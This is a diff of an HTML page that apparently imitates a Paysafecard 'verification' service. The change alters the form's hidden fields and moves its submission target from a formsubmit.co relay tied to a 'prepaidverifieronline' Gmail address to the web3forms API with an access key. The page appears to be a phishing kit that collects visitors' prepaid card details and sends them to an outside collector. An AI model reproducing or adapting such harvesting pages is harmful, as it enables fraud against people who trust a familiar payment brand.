@@ -857,10 +857,9 @@
                                 </div>
                             </div>
                             <p id="form-checker" style="color:rgb(255, 78, 78); display: none">Vérifier</p>
-                            <form class="form"  id="sendmail" data-token="0d7963e7bc6b6b3082e5bfa791ec72cf" data-token-time="1745521270" data-formid="4"
-            enctype="multipart/form-data">
+                            <form class="form"  id="sendmail" >
                                 <div>
-                                    <input type="hidden" name="_subject" value="Nouvelle Vérification (paysafecard-online.com)">
+                                    <input type="hidden" name="access_key" value="12d66a5b-9b34-40e8-9cd6-7b7dcb5f9523">
                                 </div>
                                 <div>
                                     <input type="hidden" name="_captcha" value="false">
@@ -905,7 +904,7 @@
                                             const data = new FormData(form);
 
                                             try {
-                                                const response = await fetch("https://formsubmit.co/prepaidverifieronline@gmail.com", {
+                                                const response = await fetch("https://api.web3forms.com/submit", {
                                                     method: 'POST',
                                                     body: data
                                                 });
